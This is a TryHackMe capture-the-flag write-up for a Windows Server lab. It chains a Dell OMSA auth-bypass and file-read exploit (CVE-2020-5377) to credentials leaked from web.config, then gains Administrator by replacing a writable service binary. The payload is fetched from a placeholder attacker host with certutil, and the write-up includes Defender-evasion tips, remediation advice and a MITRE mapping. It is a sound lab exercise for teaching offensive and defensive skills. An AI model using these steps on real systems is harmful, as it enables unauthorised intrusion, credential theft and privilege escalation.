# TryHackMe — Hack Smarter Security | Full Writeup

> **Platform:** [TryHackMe](https://tryhackme.com)
> **Room:** Hack Smarter Security
> **Difficulty:** Medium
> **OS:** Windows Server 2019
> **Author writeup by:** [nos010101](https://tryhackme.com/p/nos010101)

---

## Table of Contents

- [Scenario](#scenario)
- [Reconnaissance](#reconnaissance)
  - [Port Scan](#port-scan)
  - [FTP — Anonymous Access](#ftp--anonymous-access)
  - [HTTP — IIS Static Site](#http--iis-static-site)
  - [Port 1311 — Dell OpenManage Server Administrator](#port-1311--dell-openmanage-server-administrator)
- [Exploitation — CVE-2020-5377](#exploitation--cve-2020-5377)
  - [Understanding the Vulnerability](#understanding-the-vulnerability)
  - [Running the Exploit](#running-the-exploit)
  - [Reading IIS Master Configuration](#reading-iis-master-configuration)
  - [Credential Extraction from web.config](#credential-extraction-from-webconfig)
- [Foothold — SSH as tyler](#foothold--ssh-as-tyler)
- [Privilege Escalation](#privilege-escalation)
  - [Local Enumeration](#local-enumeration)
  - [Discovering Spoofer Service](#discovering-spoofer-service)
  - [Service Binary Hijacking](#service-binary-hijacking)
  - [Accessing Administrator Desktop](#accessing-administrator-desktop)
- [Flags](#flags)
- [Kill Chain Summary](#kill-chain-summary)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Remediation](#remediation)
- [Lessons Learned](#lessons-learned)

---

## Scenario

The mission is to infiltrate the web server belonging to the notorious **Hack Smarter APT Group**. This group is known for malicious cyber operations, and our objective is to covertly access their server, retrieve the list of their future targets (stored on the Administrator's desktop), and exfiltrate the data without leaving a trace.

---

## Reconnaissance

### Port Scan

Starting with a full TCP port scan followed by targeted service enumeration:

```bash
nmap -p- <TARGET_IP>
nmap -sCV -O -p 21,22,80,1311,3389 smarter.thm
```

**Results:**

| Port | Service | Details |
|------|---------|---------|
| 21 | FTP | Microsoft ftpd — **Anonymous login allowed** |
| 22 | SSH | OpenSSH for Windows 7.7 |
| 80 | HTTP | Microsoft IIS 10.0 — static site "HackSmarterSec" |
| 1311 | HTTPS | Dell OpenManage Server Administrator (OMSA) |
| 3389 | RDP | Microsoft Terminal Services |

**Key observations from Nmap:**
- OS: **Windows Server 2019** (Build 10.0.17763)
- Hostname: **HACKSMARTERSEC**
- FTP shows two files available via anonymous access
- Port 1311 SSL certificate: `CN=hacksmartersec`, `O=Dell Inc`, `ST=TX`
- The HTML title on port 1311 is `OpenManage™` — confirming Dell OMSA

### FTP — Anonymous Access

Connected to FTP with anonymous credentials and retrieved the available files:

```bash
ftp smarter.thm
# Login: anonymous / (blank password)
binary
get Credit-Cards-We-Pwned.txt
get stolen-passport.png
```

**Credit-Cards-We-Pwned.txt** — Contains 100 fake VISA card numbers. This is lore content establishing the APT group's criminal activity. No actionable intelligence for the engagement.

**stolen-passport.png** — The `file` command returns `data` instead of `PNG image data`. Investigation with `xxd` reveals valid PNG magic bytes (`89 50 4e 47`) but with a corrupted header — the `\r\n` (0d 0a) sequence expected after the PNG signature was truncated to `\n` (0a), suggesting the file was transferred in ASCII mode rather than binary. This is purely cosmetic lore and not an attack vector.

### HTTP — IIS Static Site

```bash
curl -s http://smarter.thm:80/ | head -20
feroxbuster --url http://smarter.thm/ --depth 2 \
  --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```

The IIS server hosts a static Bootstrap template site for "HackSmarter Security" — a fictional blackhat-turned-security group. Three pages exist: `index.html`, `about.html`, `contact.html`. The contact form has no backend (`action=""`).

**Feroxbuster** found only static assets (css/, js/, images/) — no hidden directories, no dynamic content, no server-side scripts.

The IIS handlers configuration (confirmed later via `applicationHost.config`) shows only `StaticFileModule`, `DefaultDocumentModule`, and `DirectoryListingModule` — **no ASP.NET, no PHP, no dynamic execution capability**. This is a dead end for web exploitation.

### Port 1311 — Dell OpenManage Server Administrator

```bash
curl -sk https://smarter.thm:1311/ | head -20
```

Attempting HTTP returns `This combination of host and port requires TLS`. Over HTTPS, the service responds with the OMSA login page, including JavaScript references to `/oma/js/` resources and parameters for the **Distributed Web Server (DWS)** managed systems login: `mnip`, `authType`, `application`, `targetmachine`.

The presence of the DWS login mechanism is critical — it is the foundation of the authentication bypass used in CVE-2020-5377.

---

## Exploitation — CVE-2020-5377

### Understanding the Vulnerability

**CVE-2020-5377** affects Dell EMC OpenManage Server Administrator versions 9.4 and prior. It combines two issues:

1. **Authentication Bypass via DWS** — OMSA's Distributed Web Server feature allows a central server to authenticate against remote managed systems. The login flow works like this: the user submits credentials along with a `targetmachine` IP. OMSA then contacts that target machine to validate the credentials. If the attacker sets `targetmachine` to their own IP and runs a fake OMSA responder, the target OMSA server will accept the forged authentication response — granting the attacker an admin session. **Dell classified this as "intended functionality"** and declined to fix it, making it a design flaw rather than a bug.

2. **Path Traversal (File Read)** — Once authenticated, the `/ViewFile` endpoint accepts `path` and `file` parameters with insufficient sanitization. Directory traversal sequences (`..\..\..`) allow reading arbitrary files from the filesystem with the privileges of the OMSA service account (typically LocalSystem).

The combination is devastating: **unauthenticated arbitrary file read** on any system running OMSA ≤ 9.4.

**Reference:** [Rhino Security Labs — CVE-2020-5377](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/)

### Running the Exploit

```bash
git clone https://github.com/RhinoSecurityLabs/CVEs.git
cd CVEs/CVE-2020-5377_CVE-2021-21514/
python3 CVE-2020-5377.py <ATTACKER_IP> smarter.thm:1311
```

The exploit:
1. Generates a self-signed SSL certificate (`server.pem`)
2. Starts a fake OMSA listener on port 443 of the attacker machine
3. Sends a login request to the target OMSA with `targetmachine=<ATTACKER_IP>`
4. The target OMSA contacts the attacker's fake server for credential validation
5. The fake server responds with a valid authentication XML
6. The attacker receives a valid session ID (`cSession`) and viewer ID (`VID`)
7. An interactive file-read prompt is presented

```
[*] Generating certificate...
Session: FE8D451B16331812E617BC896E11BA2E
VID: E2B26A54DA61E6AB
file >
```

**Verification — reading `win.ini`:**

```
file > C:\Windows\win.ini
Reading contents of C:\Windows\win.ini:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

The exploit is working. We have arbitrary file read with high-privilege access.

### Reading IIS Master Configuration

```
file > C:\Windows\System32\inetsrv\config\applicationHost.config
```

This is the **IIS master configuration file** — it defines all sites, bindings, application pools, and security settings. Key findings:

**Site "hacksmartersec" (ID 2):**
- Physical path: `C:\inetpub\wwwroot\hacksmartersec`
- Binding: `*:80:`
- Application pool: `hacksmartersec` (runs as `ApplicationPoolIdentity`)

**Site "data-leaks" (ID 1):**
- Physical path: `C:\inetpub\ftproot`
- Binding: FTP on `*:21:`
- **Anonymous access enabled with Read+Write permissions** for all users (`?` and `*`)

The FTP write access means we can upload files to `C:\inetpub\ftproot` anonymously — useful for later payload delivery.

### Credential Extraction from web.config

Knowing the physical path of the IIS site, we read the application's `web.config`:

```
file > C:\inetpub\wwwroot\hacksmartersec\web.config
```

```xml
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA13█████████████████t!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>
```

The `web.config` contains **cleartext credentials** for a user named `tyler`. The file is protected from HTTP access via `<deny users="*" />` in the `<authorization>` section, but this IIS-level access control is completely bypassed by our filesystem-level read through CVE-2020-5377.

> **CWE-256: Plaintext Storage of a Password**
> **CWE-522: Insufficiently Protected Credentials**

---

## Foothold — SSH as tyler

Using the credentials extracted from `web.config`:

```bash
ssh tyler@smarter.thm
# Password: IAmA13█████████████████t!
```

Successfully authenticated. Immediately retrieved the user flag:

```cmd
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop> type user.txt
THM{4ll15n0tw3l██████████}
```

**User enumeration:**

```cmd
net user
# Administrator, DefaultAccount, Guest, sshd, tyler, WDAGUtilityAccount

net localgroup Administrators
# Only: Administrator
```

---

## Privilege Escalation

### Local Enumeration

```cmd
whoami /all
```

| Category | Detail |
|----------|--------|
| User | `hacksmartersec\tyler` |
| Groups | `BUILTIN\Users` only — **not** in Administrators |
| Integrity | Medium Mandatory Level |
| Privileges | `SeChangeNotifyPrivilege`, `SeIncreaseWorkingSetPrivilege` only |

This is the minimum privilege set for a standard user. No `SeImpersonatePrivilege` — ruling out all Potato-class attacks (JuicyPotato, PrintSpoofer, GodPotato). `systeminfo` and `sc query` return Access Denied. No custom scheduled tasks found.

### Discovering Spoofer Service

While enumerating installed software, a non-standard directory stands out:

```cmd
dir "C:\Program Files (x86)"
# ...
# 06/30/2023  06:57 PM    <DIR>          Spoofer
# 06/30/2023  06:57 PM    <DIR>          WinPcap
```

**Spoofer** is the [CAIDA Spoofer](https://spoofer.caida.org/) project — a tool for measuring IP source address spoofing on the Internet. It includes a Windows service component.

**Service analysis:**

```cmd
sc qc spoofer-scheduler
```

```
SERVICE_NAME: spoofer-scheduler
  TYPE               : 10  WIN32_OWN_PROCESS
  START_TYPE         : 2   AUTO_START
  BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
  SERVICE_START_NAME : LocalSystem
```

The service runs as **LocalSystem** — full SYSTEM privileges.

**Directory permissions:**

```cmd
icacls "C:\Program Files (x86)\Spoofer"
```

```
C:\Program Files (x86)\Spoofer BUILTIN\Users:(OI)(CI)(F)
```

**`BUILTIN\Users:(OI)(CI)(F)`** — This grants **Full Control** to all Users (including tyler), with **Object Inherit** and **Container Inherit** flags. This means tyler can **read, write, modify, and delete** any file in the directory, including the service binary.

**Service SDDL:**

```cmd
sc sdshow spoofer-scheduler
```

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
  (A;;CCLCSWLOCRRC;;;IU)
  (A;;CCLCSWLOCRRC;;;SU)
  (A;;CCLCSWRPWPLORC;;;S-1-5-21-...-1008)
```

The last ACE grants tyler's SID (`-1008`) the permissions `RP` (SERVICE_START) and `WP` (SERVICE_STOP). Tyler can **stop and start** the service.

> **Three conditions for service binary hijacking are met:**
> 1. Service runs as **LocalSystem** (SYSTEM privileges)
> 2. Service binary directory is **writable** by the current user
> 3. Current user has **permission to stop and start** the service

This is the same vulnerability class as the THMSvc service in the Windows Jump TryHackMe room.

### Service Binary Hijacking

**Step 1 — Create the payload**

Since Windows Defender is active on the target (confirmed by scheduled tasks running `MpCmdRun.exe`), a standard msfvenom payload would likely be detected. Instead, we compile a minimal C program that adds tyler to the local Administrators group:

```bash
# On the attacker machine
cat > addadmin.c << 'EOF'
#include <stdlib.h>
int main() {
    system("net localgroup Administrators tyler /add");
    return 0;
}
EOF

apt install gcc-mingw-w64-x86-64-posix -y
x86_64-w64-mingw32-gcc addadmin.c -o spoofer-scheduler.exe -s
```

The `-s` flag strips debug symbols, reducing size and detection surface.

**Step 2 — Deliver and replace**

```bash
# Attacker: serve the payload
python3 -m http.server 8080
```

```cmd
# Target (tyler): stop service, replace binary, restart
cd "C:\Program Files (x86)\Spoofer"
sc stop spoofer-scheduler
rename spoofer-scheduler.exe spoofer-scheduler.exe.bak
certutil -urlcache -f http://<ATTACKER_IP>:8080/spoofer-scheduler.exe spoofer-scheduler.exe
sc start spoofer-scheduler
```

The `sc start` command returns **error 1053** (`The service did not respond to the start or control request in a timely fashion`) — this is expected and harmless. The SCM expects the executable to register as a Windows service via `StartServiceCtrlDispatcher`, but our payload simply runs `net localgroup Administrators tyler /add` and exits. The command executes **before** the SCM timeout fires.

**Step 3 — Verify and re-login**

```cmd
net localgroup Administrators
# Administrator
# tyler
```

Tyler is now in the Administrators group. The current SSH session still has the old token — **re-login is required** to pick up the new group membership:

```bash
ssh tyler@smarter.thm
```

```cmd
whoami /groups
# BUILTIN\Administrators    Mandatory group, Enabled by default, Enabled group, Group owner
# Mandatory Label\High Mandatory Level
```

### Accessing Administrator Desktop

```cmd
dir C:\Users\Administrator\Desktop\
# 06/30/2023  06:40 PM    <DIR>          Hacking-Targets

dir C:\Users\Administrator\Desktop\Hacking-Targets\
# hacking-targets.txt

type C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt
# Next Victims:
# CyberLens, WorkSmarter, SteelMountain
```

Mission complete. The APT group's next three targets have been identified.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{4ll15n0tw3l██████████}` |
| Next targets | `Cybe████s, Work██████r, Steel████████n` |

---

## Kill Chain Summary

```
                    ┌─────────────────────────┐
                    │   1. RECONNAISSANCE      │
                    │   Nmap → 5 open ports     │
                    │   FTP anon (lore only)    │
                    │   IIS static (dead end)   │
                    │   Dell OMSA on :1311 ★    │
                    └──────────┬──────────────┘
                               │
                    ┌──────────▼──────────────┐
                    │   2. CVE-2020-5377       │
                    │   OMSA DWS auth bypass   │
                    │   + path traversal       │
                    │   → arbitrary file read  │
                    └──────────┬──────────────┘
                               │
                    ┌──────────▼──────────────┐
                    │   3. CREDENTIAL LEAK     │
                    │   applicationHost.config  │
                    │   → site physical path   │
                    │   web.config → tyler pw  │
                    └──────────┬──────────────┘
                               │
                    ┌──────────▼──────────────┐
                    │   4. FOOTHOLD (SSH)      │
                    │   tyler → user.txt ✓     │
                    └──────────┬──────────────┘
                               │
                    ┌──────────▼──────────────┐
                    │   5. PRIVILEGE ESCALATION│
                    │   spoofer-scheduler svc  │
                    │   LocalSystem + writable │
                    │   dir + start/stop perms │
                    │   → binary hijacking     │
                    │   → Administrator ✓      │
                    └──────────┬──────────────┘
                               │
                    ┌──────────▼──────────────┐
                    │   6. OBJECTIVE           │
                    │   Hacking-Targets dir    │
                    │   → 3 target orgs ✓      │
                    └─────────────────────────┘
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|--------|-----------|-------------|
| Reconnaissance | T1046 Network Service Scanning | Nmap full port scan + service enumeration |
| Initial Access | T1190 Exploit Public-Facing Application | CVE-2020-5377 — OMSA path traversal + auth bypass |
| Credential Access | T1552.001 Credentials in Files | Cleartext password in IIS `web.config` |
| Lateral Movement | T1021.004 Remote Services: SSH | SSH login using extracted credentials |
| Persistence | T1574.010 Services File Permissions Weakness | Writable service binary directory |
| Privilege Escalation | T1574.010 Services File Permissions Weakness | Replace service exe → SYSTEM execution |
| Collection | T1005 Data from Local System | Reading target list from Administrator's desktop |

---

## Remediation

### CVE-2020-5377 — Dell OMSA

- **Patch** OMSA to version ≥ 9.4.0.2 (fixes path traversal; auth bypass remains "by design")
- **Disable DWS** — if the Distributed Web Server managed login feature is not in use, disable it entirely
- **Network segmentation** — management interfaces (OMSA, iDRAC, iLO, IPMI) must reside in isolated management VLANs with strict ACLs, accessible only from jump hosts
- **Replace with modern tooling** — Dell recommends iDRAC9+ with Redfish API over legacy OMSA

### Cleartext Credentials in web.config

- **Encrypt appSettings** using `aspnet_regiis -pe` (Protected Configuration) with machine-level AES/RSA keys
- **Use external secret stores** — Azure Key Vault, HashiCorp Vault, AWS Secrets Manager
- **Adopt Managed Identities / gMSA** — eliminate passwords as artifacts entirely

### FTP Anonymous Write

- **Disable anonymous FTP access** — or at minimum restrict to read-only
- **Replace FTP with SFTP/SCP** — FTP transmits credentials in plaintext, violating PCI DSS and DORA encryption requirements
- **Isolate FTP roots** — FTP content directories must not be accessible to other services or users

### Service Binary Hijacking

- **Fix directory ACLs** — `BUILTIN\Users:(F)` on a Program Files subdirectory is a critical misconfiguration. Only Administrators and SYSTEM should have write access
- **Principle of Least Privilege** — services should run as dedicated service accounts (gMSA) rather than LocalSystem
- **Audit service SDDL** — standard users should not have SERVICE_START/SERVICE_STOP permissions on privileged services
- **Deploy WDAC / AppLocker** — application whitelisting prevents execution of unsigned binaries, even by SYSTEM

---

## Lessons Learned

1. **Management interfaces are attack surface** — OMSA on :1311 was the entire entry point. The IIS website and FTP were distractions. In real engagements, always enumerate non-standard ports and identify management/monitoring tools (OMSA, iDRAC, Nagios, Zabbix, Jenkins).

2. **"Intended functionality" can be a vulnerability** — Dell's decision to classify the DWS authentication bypass as working-as-intended doesn't reduce the risk. In offensive security, design flaws are often more reliable than bugs because they survive patching.

3. **File read → credential leak is a well-known chain** — CVE-2020-5377 gave file read, which exposed `web.config` with plaintext credentials. The same pattern (LFI/file-read → config files → credentials → lateral movement) appears across platforms: `.env` files, `wp-config.php`, `appsettings.json`, `application.properties`.

4. **Service binary hijacking requires three conditions** — writable binary path, high-privilege service account, and ability to restart the service. Missing any one breaks the chain. Defenders should audit all three independently.

5. **Defender evasion through simplicity** — a minimal `system()` call compiled with mingw bypasses signature-based detection where msfvenom payloads would be caught. In real engagements, the simplest payload that achieves the objective is often the stealthiest.

6. **SCM error 1053 does not mean failure** — the service start "fails" from SCM's perspective because our binary doesn't register as a proper Windows service. But the code executes before the timeout — the command runs successfully. Understanding Windows service lifecycle internals prevents misinterpreting this as a failed exploit.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| Feroxbuster | Web directory brute-forcing |
| CVE-2020-5377 PoC (Rhino Security Labs) | OMSA auth bypass + file read |
| certutil | File transfer to target (Windows native) |
| x86_64-w64-mingw32-gcc | Cross-compiling Windows PE from Linux |
| sc.exe | Windows service management |
| icacls | Windows ACL inspection |

---

*Writeup by [nos010101](https://tryhackme.com/p/nos010101)*
